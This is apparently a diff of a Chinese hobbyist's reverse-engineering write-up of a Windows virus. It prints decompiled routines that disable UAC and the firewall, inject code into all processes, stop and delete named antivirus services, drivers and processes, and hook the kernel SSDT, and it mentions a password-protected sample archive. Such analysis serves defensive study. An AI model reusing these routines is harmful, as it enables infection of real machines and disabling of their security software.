- if ( !RegOpenKeyExA(HKEY\_LOCAL\_MACHINE, off\_4016D4, 0, 0xF003Fu, &hKey) )  
-  {  
-    \*(\_DWORD \*)nSize = 0;  
-    RegSetValueExA(hKey, strEnableLUA, 0, 4u, nSize, 4u);  
-    RegCloseKey(hKey);  
-  }  
-  lstrcpyA(&SubKey, strShare);  
-  lstrcatA(&SubKey, strAuthorizeApplication);  
-  if ( !RegOpenKeyExA(HKEY\_LOCAL\_MACHINE, &SubKey, 0, 0xF003Fu, &hKey) )  
-  {  
-    GetModuleFileNameA(0, &strModuleName, 0x200u);  
-    wsprintfA(&SubKey, strPartStripsec, &strModuleName);  
-    subLen = lstrlenA(&SubKey);  
-    RegSetValueExA(hKey, &strModuleName, 0, 1u, (const BYTE \*)&SubKey, subLen);  
-    RegCloseKey(hKey);                          // 注册表添加模块主允许  
-  }  
-  if ( !RegOpenKeyExA(HKEY\_LOCAL\_MACHINE, strShare, 0, 0xF003Fu, &hKey) )  
-  {  
-    \*(\_DWORD \*)nSize = 0;  
-    RegSetValueExA(hKey, strEnableFireWall, 0, 4u, nSize, 4u);  
-    \*(\_DWORD \*)nSize = 0;  
-    RegSetValueExA(hKey, strDonotAllowExcep, 0, 4u, nSize, 4u);  
-    \*(\_DWORD \*)nSize = 1;  
-    RegSetValueExA(hKey, strDisableNotify, 0, 4u, nSize, 4u);  
-    RegCloseKey(hKey);                          // 关闭防火墙，和 禁止掉 一些 警告语  
-  }  
-  GetWindowsDirectoryA(strWindowsDir, 0x104u);  
-  if ( \*(\_BYTE \*)(lstrlenA(strWindowsDir) + 0x4394E3) != '\\\\' )  
-    lstrcatA(strWindowsDir, "\\\\");  
-  \*(\_DWORD \*)nSize = 128;  
-  GetComputerNameA(&SubKey, (LPDWORD)nSize);    // 获取计算机名称  
-  if ( lstrlenA(&SubKey) > 2 )  
-  {  
-    LOBYTE(v24) = SubKey;  
-    LOBYTE(v23) = \*(&v41 + lstrlenA(&SubKey));  
-    nullsub\_1 = (unsigned \_\_int8)v23 \* (unsigned \_\_int8)v24 + 1060;  
-  }  
-  lstrcpyA((LPSTR)&String2, "Software\\\\");  
-  \*(\_DWORD \*)nSize = 128;  
-  GetUserNameA(&SubKey, (LPDWORD)nSize);  
-  if ( lstrlenA(&SubKey) < 4 )  
-    lstrcpyA(&SubKey, strMonga\_bonga);          // 小于 4 用自己的名称  
-  CopyBufferByLen(&dword\_4394E0, &SubKey, 4);  
-  for ( i = 0; ; ++i )  
-  {  
-    v3 = lstrlenA(&SubKey);  
-    if ( i >= v3 )  
-      break;  
-    if ( i >= 0x10 )  
-      break;  
-    \*(\_DWORD \*)nSize = ((unsigned \_\_int8)dword\_4394E0 ^ i) + \*(&SubKey + i);  
-    if ( \*(\_DWORD \*)nSize < 0 )  
-      \*(\_DWORD \*)nSize = -\*(\_DWORD \*)nSize;  
-    \*(&String2 + lstrlenA(&String2)) = nSize\[0\] % 0x19u + (i > 0 ? 97 : 65);// 将加密的计算机名字 接到 SoftWare 后面  
-  }                                             // 上面这一 for 循环主要是 加密计算机名字  
-  if ( GenerateRadomNameFile(strWindowsDir) )   // 产生随即名字，并打开文件利用 createfile 测试是否是唯一的  
-  {  
-    lstrcpyA((LPSTR)&strRandomFileName, strWindowsDir);  
-  }  
-  else  
-  {  
-    GetTempPathA(0xE4u, (LPSTR)&strRandomFileName);  
-    if ( byte\_4396EB\[lstrlenA(&strRandomFileName)\] != '\\\\' )  
-      lstrcatA((LPSTR)&strRandomFileName, "\\\\");  
-    if ( !GenerateRadomNameFile(&strRandomFileName) )  
-      lstrcpyA((LPSTR)&strRandomFileName, off\_401684);  
-  }  
-  for ( i = 0; ; ++i )  
-  {  
-    v4 = lstrlenA(&SubKey);  
-    if ( i >= v4 )  
-      break;  
-    if ( i >= 0x10 )  
-      break;  
-    \*(\_DWORD \*)nSize = dword\_4394E0 \* ((unsigned \_\_int8)dword\_4394E0 ^ i) + \*(&SubKey + i);// 解密计算机名称  
-    if ( \*(\_DWORD \*)nSize < 0 )  
-      \*(\_DWORD \*)nSize = -\*(\_DWORD \*)nSize;  
-    \*(&strRandomFileName + lstrlenA(&strRandomFileName)) = nSize\[0\] % 0x19u + 97;// 加到即将生产的文件后面去命名  
-  }  
-  lstrcatA((LPSTR)&strRandomFileName, strDotLog);// 到这里 就完成随即命名生产.log 后缀的文件名  
-  hFileMappingControlPury = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x15400u, strMappingFile);  
-  
-  
-  
-\--------2.productInjectCodeAndInjectEvery   远程注入 主题 Mapping 的 code 进行注入 ，注入前注意有对函数地址的修正，就是硬编码修正，看 ida 注释很详细  
-BOOL \_\_cdecl injectEveryModule()  
-{  
-  DWORD pid; // ST08\_4@7  
-  int v1; // eax@7  
-  HANDLE v2; // ST14\_4@7  
-  DWORD v3; // ST08\_4@14  
-  int v4; // eax@14  
-  HANDLE v5; // ST10\_4@14  
-  PROCESSENTRY32 pe; // \[sp+Ch\] \[bp-234h\]@2  
-  HANDLE hSnapshot; // \[sp+134h\] \[bp-10Ch\]@1  
-  DWORD v9; // \[sp+138h\] \[bp-108h\]@1  
-  CHAR String; // \[sp+13Ch\] \[bp-104h\]@1  
-  char v11\[256\]; // \[sp+13Dh\] \[bp-103h\]@1  
-  \_\_int16 v12; // \[sp+23Dh\] \[bp-3h\]@1  
-  char v13; // \[sp+23Fh\] \[bp-1h\]@1  
-  
-  v9 = 0;  
-  String = 0;  
-  memset(v11, 0, sizeof(v11));  
-  v12 = 0;  
-  v13 = 0;  
-  hSnapshot = CreateToolhelp32Snapshot(2u, 0);  
-  if ( hSnapshot )  
-  {  
-    pe.dwSize = 296;  
-    memset(&pe.cntUsage, 0, 0x124u);  
-    if ( Process32First(hSnapshot, &pe) )  
-    {  
-      if ( pe.th32ProcessID > 10 )  
-      {  
-        if ( lstrlenA(pe.szExeFile) <= 64 )  
-          lstrcpyA(&String, pe.szExeFile);  
-        else  
-          lstrcpynA(&String, pe.szExeFile, 64);  
-        CharLowerA(&String);  
-        pid = pe.th32ProcessID;  
-        v1 = lstrlenA(&String);  
-        wsprintfA(&String + v1, "M\_%d\_", pid);  
-        v2 = CreateMutexA(0, 0, &String);  
-        v9 = GetLastError();  
-        ReleaseMutex(v2);  
-        CloseHandle(v2);  
-        if ( !v9 )  
-          injectModuleProcces(pe.th32ProcessID, pe.th32ProcessID, &String);  
-      }  
-    }  
-    while ( Process32Next(hSnapshot, &pe) )  
-    {  
-      if ( pe.th32ProcessID > 0xA )  
-      {  
-        if ( lstrlenA(pe.szExeFile) <= 64 )  
-          lstrcpyA(&String, pe.szExeFile);  
-        else  
-          lstrcpynA(&String, pe.szExeFile, 64);  
-        CharLowerA(&String);  
-        v3 = pe.th32ProcessID;  
-        v4 = lstrlenA(&String);  
-        wsprintfA(&String + v4, "M\_%d\_", v3);  
-        v5 = CreateMutexA(0, 0, &String);  
-        v9 = GetLastError();  
-        ReleaseMutex(v5);  
-        CloseHandle(v5);  
-        if ( !v9 )                              // 未被注入过 就一个个注入  
-          injectModuleProcces((int)&String, pe.th32ProcessID, &String);  
-      }  
-    }  
-  }  
-  return CloseHandle(hSnapshot);  
-}  
-  
-  
-if ( !lstrcmpiA(&String1, "system")  
-    || !lstrcmpiA(&String1, "local service")  
-    || !lstrcmpiA(&String1, "network service") )  
-  {  
-    CreateMutexA(0, 0, lpString);  
-    v47 = -1;  
-    goto LABEL\_50;  
-  }  
-  v8 = VirtualAllocEx(hProcess, 0, 0x2000u, 0x3000u, 0x40u);  
-  lpStartAddress = v8;  
-  if ( v8 )  
-  {  
-    if ( !WriteProcessMemory(hProcess, lpStartAddress, &codepuryFileBuffer, 0x2000u, &NumberOfBytesWritten) )// 远程注入刚才生成好的地址模块  
-  
-  
-  
-  
-\---------3.FuckSaftySoftInR0AndR3  
-             关于杀毒安全软件，其采取先关服务和关闭驱动，然后关已启动的进程  
-  
-{  
-                    LoadiPfltDrvFunc();  
-                    v1 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)FuckTheSecuritySoftAndDelete, 0, 0, &ThreadId);  
-                    WaitObject(v1, 0, 0);  
-                    hModuleNtdll = LoadLibraryA(strNtdll);  
-                    if ( hModuleNtdll )  
-                    {  
-                      adrNtQuerySystemInformation = (int (\_\_stdcall \*)(\_DWORD, \_DWORD, \_DWORD, \_DWORD))GetProcAddress(hModuleNtdll, stNtQuerySystemInformation);  
-                      if ( adrNtQuerySystemInformation )  
-                      {  
-                        if ( !ifAmsint32Exist() )  
-                        {  
-                          ReSizeAndGenericPEfile(byte\_4A82D8, off\_40167C, 0x1425u);  
-                          sub\_429243(off\_4016B0, byte\_4A82D8);  
-                        }  
-                        if ( ifAmsint32Exist() )  
-                        {  
-                          if ( getSSDTENtryBak() )  
-                          {  
-                            v2 = CreateThread(  
-                                   0,  
-                                   0,  
-                                   (LPTHREAD\_START\_ROUTINE)ThreadProc2\_1FuckAndProctect,  
-                                   0,  
-                                   0,  
-                                   &ThreadId);  
-                            WaitObject(v2, 0, 0);  
-  
-  
-  
-void \_\_userpurge FuckTheSecuritySoftAndDelete(int a1<eax>, int a2//驱动关闭删除  
-{  
-  char v2; // \[sp-Ch\] \[bp-2Ch\]@1  
-  unsigned int v3; // \[sp+0h\] \[bp-20h\]@1  
-  int v4; // \[sp+4h\] \[bp-1Ch\]@1  
-  char \*v5; // \[sp+8h\] \[bp-18h\]@1  
-  int v6; // \[sp+10h\] \[bp-10h\]@1  
-  int (\*v7)(); // \[sp+14h\] \[bp-Ch\]@1  
-  int v8; // \[sp+18h\] \[bp-8h\]@1  
-  int v9; // \[sp+1Ch\] \[bp-4h\]@1  
-  
-  v8 = (int)dword\_423FC8;  
-  v7 = except\_handler3;  
-  v6 = a1;  
-  v5 = &v2;  
-  v9 = 0;  
-  v3 = 0;  
-  v4 = adrOpenSCManager(0, 0, 983103);  
-  while ( 1 )  
-  {  
-    Sleep(0x1000u);  
-    v3 = 0;  
-    while ( v3 < 0x96 && lstrlenA((&lpString)\[4 \* v3\]) > 0 )  
-    {  
-      CloseSeritySoftAndDeleteit(v4, (&lpString)\[4 \* v3++\], 1);  
-      Sleep(0x80u);                             // 循环去关闭杀毒软件的服务 和删除相应的驱动 看 lpstring：  
-                                                // t:004018E0                                                 ; sub\_42940A+9A\_r  
-                                                // .text:004018E0                                                 ; "AVP"  
-                                                // .text:004018E4 F0 28 42 00       dd offset aAgnitumClientS     ; "Agnitum Client Security Service"  
-                                                // .text:004018E8 10 29 42 00       dd offset off\_422910  
-                                                // .text:004018EC 14 29 42 00       dd offset dword\_422914  
-                                                // .text:004018F0 24 29 42 00       dd offset aAswupdsv           ; "aswUpdSv"  
-                                                // .text:004018F4 30 29 42 00       dd offset aAswmon2            ; "aswMon2"  
-                                                // .text:004018F8 38 29 42 00       dd offset aAswrdr             ; "aswRdr"  
-                                                // .text:004018FC 40 29 42 00       dd offset aAswsp              ; "aswSP"  
-                                                // .text:00401900 48 29 42 00       dd offset aAswtdi             ; "aswTdi"  
-                                                // .text:00401904 50 29 42 00       dd offset aAswfsblk           ; "aswFsBlk"  
-                                                // .text:00401908 5C 29 42 00       dd offset aAcssrv             ; "acssrv"  
-                                                // .text:0040190C 64 29 42 00       dd offset aAvEngine           ; "AV Engine"  
-                                                // .text:00401910 70 29 42 00       dd offset aAvastIavs4Cont     ; "avast! iAVS4 Control Service"  
-                                                // .text:00401914 90 29 42 00       dd offset aAvastAntivirus     ; "avast! Antivirus"  
-                                                // .text:00401918 A4 29 42 00       dd offset aAvastMailScann     ; "avast! Mail Scanner"  
-                                                // .text:0040191C B8 29 42 00       dd offset aAvastWebScanne     ; "avast! Web Scanner"  
-                                                // .text:00401920 CC 29 42 00       dd offset aAvastAsynchron     ; "avast! Asynchronous Virus Monitor"  
-                                                // .text:00401924 F0 29 42 00       dd offset aAvastSelfProte     ; "avast! Self Protection"  
-                                                // .text:00401928 08 2A 42 00       dd offset aAvgEMailScanne     ; "AVG E-mail Scanner"  
-                                                // .text:0040192C 1C 2A 42 00       dd offset aAviraAntivirPr     ; "Avira AntiVir Premium Guard"  
-                                                // .text:00401930 38 2A 42 00       dd offset aAviraAntivir\_0     ; "Avira AntiVir Premium WebGuard"  
-                                                // .text:00401934 58 2A 42 00       dd offset aAviraAntivir\_1     ; "Avira AntiVir Premium MailGuard"  
-                                                // .text:00401938 78 2A 42 00       dd offset aBglivesvc          ; "BGLiveSvc"  
-                                                // .text:0040193C 84 2A 42 00       dd offset aBlackice           ; "BlackICE"  
-                                                // .text:00401940 90 2A 42 00       dd offset aCaisafe            ; "CAISafe"  
-                                                // .text:00401944 98 2A 42 00       dd offset aCcevtmgr           ; "ccEvtMgr"  
-                                                // .text:00401948 A4 2A 42 00       dd offset aCcproxy            ; "ccProxy"  
-                                                // .text:0040194C AC 2A 42 00       dd offset aCcsetmgr           ; "ccSetMgr"  
-                                                // .text:00401950 B8 2A 42 00       dd offset aComodoFirewall     ; "COMODO Firewall Pro Sandbox Driver"  
-                                                // .text:00401954 DC 2A 42 00       dd offset aCmdguard           ; "cmdGuard"  
-                                                // .text:00401958 E8 2A 42 00       dd offset aCmdagent           ; "cmdAgent"  
-                                                // .text:0040195C F4 2A 42 00       dd offset aEsetService        ; "Eset Service"  
-                                                // .text:00401960 04 2B 42 00       dd offset aEsetHttpServer     ; "Eset HTTP Server"  
-                                                // .text:00401964 18 2B 42 00       dd offset aEsetPersonalFi     ; "Eset Personal Firewall"  
-                                                // .text:00401968 30 2B 42 00       dd offset aFProtAntivirus     ; "F-Prot Antivirus Update Monitor"  
-                                                // .text:0040196C 50 2B 42 00       dd offset aFsbwsys            ; "fsbwsys"  
-                                                // .text:00401970 58 2B 42 00       dd offset aFsdfwd             ; "FSDFWD"  
-                                                // .text:00401974 60 2B 42 00       dd offset aFSecureGatekee     ; "F-Secure Gatekeeper Handler Starter"  
-                                                // .text:00401978 84 2B 42 00       dd offset aFsma               ; "FSMA"  
-                                                // .text:0040197C 8C 2B 42 00       dd offset aGoogleOnlineSe     ; "Google Online Services"  
-                                                // .text:00401980 A4 2B 42 00       dd offset aInorpc             ; "InoRPC"  
-                                                // .text:00401984 AC 2B 42 00       dd offset aInort              ; "InoRT"  
-                                                // .text:00401988 B4 2B 42 00       dd offset aInotask            ; "InoTask"  
-                                                // .text:0040198C BC 2B 42 00       dd offset aIssvc              ; "ISSVC"  
-                                                // .text:00401990 C4 2B 42 00       dd offset aKpf4               ; "KPF4"  
-                                                // .text:00401994 CC 2B 42 00       dd offset aKlif               ; "KLIF"  
-                                                // .text:00401998 D4 2B 42 00       dd offset aLavasoftfirewa     ; "LavasoftFirewall"  
-                                                // .text:0040199C E8 2B 42 00       dd offset aLivesrv            ; "LIVESRV"  
-                                                // .text:004019A0 F0 2B 42 00       dd offset aMcafeeframewor   
-    }  
-    Sleep(0x2D000u);  
-  }  
-}  
-  
-  
-  
-  
-  
-  
-BOOL \_\_cdecl ContinuFuckAndProctect() 关掉进程  
-{  
-  PROCESSENTRY32 pe; // \[sp+4h\] \[bp-23Ch\]@2  
-  DWORD v2; // \[sp+12Ch\] \[bp-114h\]@1  
-  HANDLE hObject; // \[sp+130h\] \[bp-110h\]@1  
-  int i; // \[sp+134h\] \[bp-10Ch\]@1  
-  int v5; // \[sp+138h\] \[bp-108h\]@1  
-  char v6; // \[sp+13Ch\] \[bp-104h\]@1  
-  char v7; // \[sp+13Dh\] \[bp-103h\]@1  
-  \_\_int16 v8; // \[sp+23Dh\] \[bp-3h\]@1  
-  char v9; // \[sp+23Fh\] \[bp-1h\]@1  
-  
-  i = 0;  
-  v5 = 0;  
-  v2 = 0;  
-  v6 = 0;  
-  memset(&v7, 0, 0x100u);  
-  v8 = 0;  
-  v9 = 0;  
-  hObject = CreateToolhelp32Snapshot(2u, 0);  
-  if ( hObject )  
-  {  
-    memset(&pe.cntUsage, 0, 0x124u);  
-    pe.dwSize = 296;  
-    if ( Process32First(hObject, &pe) )  
-    {  
-      CharUpperA(pe.szExeFile);  
-      for ( i = 0; \*strSafeSoft\[i\]; ++i )  
-      {  
-        if ( compareString(pe.szExeFile, strSafeSoft\[i\]) )  
-        {  
-          terminateSoftyProccess(pe.th32ProcessID);  
-          v2 = pe.th32ProcessID;  
-          Sleep(0x400u);  
-          break;  
-        }  
-      }  
-      if ( pe.th32ProcessID != v2 )             // 保护自己的进程  
-      {  
-        if ( FindDWEBIO(pe.th32ProcessID) )  
-        {  
-          terminateSoftyProccess(pe.th32ProcessID);  
-          v2 = pe.th32ProcessID;  
-          Sleep(0x400u);  
-        }  
-      }  
-    }  
-LABEL\_11:  
-    while ( Process32Next(hObject, &pe) )  
-    {  
-      CharUpperA(pe.szExeFile);  
-      if ( pe.th32ProcessID != v2 )  
-      {  
-        if ( FindDWEBIO(pe.th32ProcessID) )  
-        {  
-          terminateSoftyProccess(pe.th32ProcessID);  
-          v2 = pe.th32ProcessID;  
-          Sleep(0x400u);  
-        }  
-        else  
-        {  
-          for ( i = 0; \*strSafeSoft\[i\]; ++i )  
-          {  
-            if ( compareString(pe.szExeFile, strSafeSoft\[i\]) )  
-            {  
-              terminateSoftyProccess(pe.th32ProcessID);  
-              v2 = pe.th32ProcessID;  
-              Sleep(0x400u);  
-              goto LABEL\_11;  
-            }  
-          }  
-  
-  
-ps:在对杀软处理时，基本采取 开辟 两线程 死循环 运行  r0 r3 结合 ，如果 r3 层关不掉   
-交给 病毒挂在的驱动继续 记住 pid  关闭看这里  
-  
- WriteFile(v3, &Buffer, 4u, &NumberOfBytesWritten, 0);// 如果没有成功内核来搞定，记录 pid  
-    result = (void \*)CloseHandle(v3);  
-  
-  
-大家也可以看看 getSSDTENtryBak() 这个函数 可能作者也是抄袭的 ，哎~~~~  
-他是想通过 r3 层获取 ssdt 表 ，对内核 直接修改，当自己驱动挂载上去，就是一份 修改后的表，达到 hook 的目的 ，下面是我找到的源码 ，其实 很有意思，但我基本 已经恢复了 ，顺便提一下 ，如果是 ida 搞清楚 pe 结构后 ，记住一定要用结构体 对 反编译的代码 进行还原，这样，代码会很容易恢复出来  
-  
-获取 KeSSdt 源码   
-  ps:这个病毒编写者很懒  
-void ReSSDT( IN HANDLE hDriver)     
-{     
-    HMODULE    hKernel;     
-    DWORD    dwKSDT;                // rva of KeServiceDescriptorTable      
-    DWORD    dwKiServiceTable;    // rva of KiServiceTable      
-    PMODULES    pModules=(PMODULES)&pModules;     
-    DWORD    dwNeededSize,rc;     
-    DWORD    dwKernelBase,dwServices=0;     
-    PCHAR    pKernelName;     
-    PDWORD    pService;     
-    PIMAGE\_FILE\_HEADER    pfh;     
-    PIMAGE\_OPTIONAL\_HEADER    poh;     
-    PIMAGE\_SECTION\_HEADER    psh;     
-     
-         
-    FARPROC NtQuerySystemInformationAddr=GetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");     
-    // get system modules - ntoskrnl is always first there,    
-    rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,4,&dwNeededSize);     
-             if (rc==STATUS\_INFO\_LENGTH\_MISMATCH)       {     
-        pModules=(MODULES \*)GlobalAlloc(GPTR,dwNeededSize);      
-             rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,dwNeededSize,NULL);     
-    }   
-    else   
-    {     
-      strange:     
-        printf("strange NtQuerySystemInformation()!\\n");     
-        return;     
-    }     
-    if (!NT\_SUCCESS(rc)) goto strange;   //不成功则退出  
-         
-    // imagebase      
-    dwKernelBase=(DWORD)pModules->smi.Base;         
-    // filename - it may be renamed in the boot.ini      
-    pKernelName=pModules->smi.ModuleNameOffset+pModules->smi.ImageName;          
-    // map ntoskrnl - hopefully it has relocs      
-    hKernel=LoadLibraryEx(pKernelName,0,DONT\_RESOLVE\_DLL\_REFERENCES);    //加载模块  
-    if (!hKernel) {     
-        printf("Failed to load! LastError=%i\\n",GetLastError());     
-        return;             
-    }     
-     
-    GlobalFree(pModules);    //释放空间  
-     
-    // our own export walker is useless here - we have GetProcAddress :)          
-    if (!(dwKSDT=(DWORD)GetProcAddress(hKernel,"KeServiceDescriptorTable")))   
-  {   //试图获取模块中的 ssdt 表基址,这里已经获取了地址  
-        printf("Can't find KeServiceDescriptorTable\\n");     
-        return;     
-    }     
-     
-    // get KeServiceDescriptorTable rva      
-    dwKSDT-=(DWORD)hKernel;      // find KiServiceTable      
-    if (!(dwKiServiceTable=FindKiServiceTable(hKernel,dwKSDT)))   
-  {   //在模块中寻找 ssdt 表偏移地址为啥这里又去寻找 ssdt 表的地址了？  
-        printf("Can't find KiServiceTable...\\n");     
-        return;     
-    }     
-     
-    printf("&KiServiceTable==%08X\\n\\nDumping 'old' ServiceTable:\\n\\n",dwKiServiceTable+dwKernelBase);         
-         
-    // let's dump KiServiceTable contents              
-         
-    // MAY FAIL!!!      
-    // should get right ServiceLimit here, but this is trivial in the kernel mode      
-    GetHeaders((PCHAR)hKernel,&pfh,&poh,&psh);        //获取文件头信息  
-     
-    for (pService=(PDWORD)((DWORD)hKernel+dwKiServiceTable);   //基址+偏移  
-            \*pService-poh->ImageBase<poh->SizeOfImage;     
-            pService++,dwServices++)     
-    {     
-        ULONG ulAddr=\*pService-poh->ImageBase+dwKernelBase;   //kernel 库文件中服务绝对地址-文件的基址+kernel 库文件的基址=相当于 kernel 文件基址的绝对地址  
-        SetProc( hDriver,dwServices, &ulAddr );               //通过驱动命令修改函数地址  
-        //printf("%08X\\n",ulAddr);          
-    }     
-             
-     
-    printf("\\n\\nPossibly KiServiceLimit==%08X\\n",dwServices);     
-     
-    FreeLibrary(hKernel);     
-     
-}     
-     
-  
-  
-DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)  //模块句柄，SSTD 表偏移地址    
-{     
-    PIMAGE\_FILE\_HEADER    pfh;     
-    PIMAGE\_OPTIONAL\_HEADER    poh;     
-    PIMAGE\_SECTION\_HEADER    psh;     
-    PIMAGE\_BASE\_RELOCATION    pbr;     
-    PIMAGE\_FIXUP\_ENTRY    pfe;         
-         
-    DWORD    dwFixups=0,i,dwPointerRva,dwPointsToRva,dwKiServiceTable;     
-    BOOL    bFirstChunk;     
-     
-    GetHeaders((PCHAR)hModule,&pfh,&poh,&psh);     
-  //获取模块 dll 的文件头信息,返回数据目录的绝对地址到 psh,poh 为文件头绝对地址，pfh 为 pe 标志绝对地址  
-     
-    // loop thru relocs to speed up the search      
-    if ((poh->DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_BASERELOC\].VirtualAddress) &&     
-        (!((pfh->Characteristics)&IMAGE\_FILE\_RELOCS\_STRIPPED)))  
-  {   //  
-             
-        pbr=(PIMAGE\_BASE\_RELOCATION)RVATOVA(poh->DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_BASERELOC\].VirtualAddress,hModule);     
-               bFirstChunk=TRUE;     
-        // 1st IMAGE\_BASE\_RELOCATION.VirtualAddress of ntoskrnl is 0      
-        while (bFirstChunk || pbr->VirtualAddress) {   //  
-            bFirstChunk=FALSE;     
-     
-            pfe=(PIMAGE\_FIXUP\_ENTRY)((DWORD)pbr+sizeof(IMAGE\_BASE\_RELOCATION));     
-这里 pfe 已经指向 IMAGE\_BASE\_RELOCATION 结构之后的另一个区段了？  
-     
-            for (i=0;i<(pbr->SizeOfBlock-sizeof(IMAGE\_BASE\_RELOCATION))>>1;i++,pfe++) {     
-                if (pfe->type==IMAGE\_REL\_BASED\_HIGHLOW)   
-          {   这里怎么能取本区段 IMAGE\_BASE\_RELOCATION 结构内的 typeoffset 里的类型？,下一个区段的？又不像  
-                    dwFixups++;     
-                    dwPointerRva=pbr->VirtualAddress+pfe->offset;     
-                    // DONT\_RESOLVE\_DLL\_REFERENCES flag means relocs aren't fixed      
-                    dwPointsToRva=\*(PDWORD)((DWORD)hModule+dwPointerRva)-(DWORD)poh->ImageBase;     
-     
-                    // does this reloc point to KeServiceDescriptorTable.Base?      
-                    if (dwPointsToRva==dwKSDT) {     
-                        // check for mov \[mem32\],imm32. we are trying to find       
-                        // "mov ds:\_KeServiceDescriptorTable.Base, offset \_KiServiceTable"      
-                        // from the KiInitSystem.      
-                        if (\*(PWORD)((DWORD)hModule+dwPointerRva-2)==0x05c7) {     
-                            // should check for a reloc presence on KiServiceTable here      
-                            // but forget it      
-                            dwKiServiceTable=\*(PDWORD)((DWORD)hModule+dwPointerRva+4)-poh->ImageBase;   这里返回的偏移地址和之前 GetProcAddress 获取的区别是什么  
-                            return dwKiServiceTable;     
-                        }     
-                    }     
-                         
-                } else     
-                    if (pfe->type!=IMAGE\_REL\_BASED\_ABSOLUTE)     
-                        // should never get here      
-                        printf("\\trelo type %d found at .%X\\n",pfe->type,pbr->VirtualAddress+pfe->offset);     
-            }     
-            \*(PDWORD)&pbr+=pbr->SizeOfBlock;     
-        }     
-    }     
-         
-    if (!dwFixups)      
-        // should never happen - nt, 2k, xp kernels have relocation data      
-        printf("No fixups!\\n");     
-    return 0;     
-}    
-  
-  
-  
-下面的几个线程基本就是感染和 连接外网通信 ，我觉得我注释的有点详细了，可能会忽略一些细节  
-，手段很常规，比如全盘感染还是 开辟线程扫盘，进行 pe 改写 然后 执行进程 。  
-  
-  
-  
-  
-  
+引用: 开门见山-----非专业人员，不喜勿喷，保持我一份纯真，爱好…..感谢 `kris`...以及帮助过我的人
 
-笔记以及脱壳以及主文件.rar  
-  
-执行体密码 ：virus
+### 核心分析
+
+1. 主体是由 `virus.exe` 构成，运行时会开辟一线程，自己 `load` `upx` 壳文件，并运行，所以我直接将 `upx` `dump` 出来，`upx` 才是真正的核心部分。
+2. 主体会创建 `purty_control` 这个映射文件，并将自己的 `00402316` 处的代码复制到 `purty_control` 文件中，让后面的 `upx` 进行远程注入。这段被注入的代码其实就是主体本身，所以可以达到很强的效果。而且 `upx` 每次注入都会加载一次，`upx` 每次加载，就会引起强大的效果，可以看后面的 `upx` 分析，里面有很多线程，包括感染、破坏杀软。
+3. 主体文件中的 `purty_control`，这个文件中的常数变量，比如下文指出 `222222, 333333`，这些都是临时的，后面 `upx` 会自己去获取系统函数对这些地方进行填充。
+4. 我这次没有对到底感染后做什么事情，因为感染的文件太多，我只逆向到，它怎么去感染，感染后干些什么事情。
+5. 看 `upx` 中，直接运行主体到适当时候，进行 `dump`，时机就是 `upx` 刚好要执行的时候，这个时候一切就绪，也就是你最好 `dump` 的效果。
+6. `upx` 手动脱壳，最好试试，呵呵，这样就比较好的去理解脱壳。
+7. `upx` 这块主要是外面几个打线程，以及开头对一个 `call`。
+8. `upx` 中有一段 `r3` 层获取 `keSSdtTable`, 进行 `hook` 的手法，我是第一次见到过，没见过的可以看看，`ida` 差不多已经还原，我也顺便贴上了百度的源码。`ps`：不记得是哪个博主的，请原谅。
+9. 对杀软的破坏，`r0` 和 `r3` 同时进行，先关 `r0` 层驱动，后关闭应用层的进程。关闭不掉的，用自己挂载的驱动进行解决 `r3` 层的关闭以及破坏。
+10. 文件的感染，这个方式他很普通，利用感染模块，便利磁盘对 `exe` 感染。如果有其他 `rar` 什么的，他就给你先修改属性，然后删除，达到破坏。
+11. 通信这一块，具体的网站已经网址下载，看常数段，表明很清楚。我只看了一些，他是通过三个线程，一个初始化，一个接受，一个发送。
+
+**总结**：它达到主体，和 `upx` 执行体，分不开。主体里可以引起执行体的生产和运行，`upx` 执行体的运行，可以引起远程注入各个进程，而注入的代码却是主体生产以及运行 `upx` 的代码......这个病毒比较强大，分析请用慎重。
+
+`Ps`：可以学习到很多编程方面的技巧，详细 `upx` 看 `idb`
+
+### 一开始花指令
+
+```
+.text:00401010                 start proc near
+.text:00401010 E8 00 00 00 00 call    $+5
+.text:00401015 5E              pop     esi
+.text:00401016 0F 6E E6        movd    mm4, esi
+.text:00401019 0F 7E E2        movd    edx, mm4
+.text:0040101C 81 C2 54 02 00 00 add    edx, 254h
+.text:00401022 52              push    edx
+.text:00401023 BB 66 5A 7B 48 mov     ebx, 487B5A66h
+.text:00401028 C3              retn          ;eip 401269
+```
+
+后面有很多处理：我没有管，直接找 `ret` 的地方，才真正到达我们分析的地方
+
+```
+00401D10   .  C3                           RETN
+00402316     E8 00000000                    CALL 0040231B
+0040231B     5D                             POP  EBP
+0040231C     8BC5                           MOV  EAX,EBP
+0040231E     81ED 05104000                  SUB  EBP,00401005         ; 重定位  之所以重定位，是因为他将是 被注入到所有进程的代码
+00402324     8A9D 73274000                 MOV  BL,BYTE PTR SS:[EBP+402773]             ; 1
+0040232A     84DB                           TEST BL,BL
+0040232C     74 13                          JE   SHORT 00402341
+0040232E     81C4 24000000                 ADD  ESP,24
+00402334     2D 0B130000                   SUB  EAX,130B
+00402339     8985 54124000                 MOV  DWORD PTR SS:[EBP+401254],EAX          ; 入口地址 00401010
+0040233F     EB 19                          JMP  SHORT 0040235A
+00402341     C785 4D144000 22222222         MOV  DWORD PTR SS:[EBP+40144D],22222222
+0040234B     C785 3A144000 33333333         MOV  DWORD PTR SS:[EBP+40143A],33333333
+00402355     E9 82000000                   JMP  004023DC  ；对上面的常数 2222222,333333 ，只是占位，后面会在注入前填充真正地址
+0040235A     33DB                           XOR  EBX,EBX
+0040235C     64:67:8B1E 3000               MOV  EBX,DWORD PTR FS:[30]           ; peb
+00402362     85DB                           TEST EBX,EBX
+00402364     78 0E                          JS   SHORT 00402374
+00402366     8B5B 0C                       MOV  EBX,DWORD PTR DS:[EBX+C]         ; InLoadOrderModuleList
+00402369     8B5B 1C                       MOV  EBX,DWORD PTR DS:[EBX+1C]       ; entryPoint
+0040236C     8B1B                           MOV  EBX,DWORD PTR DS:[EBX]          ; Flink
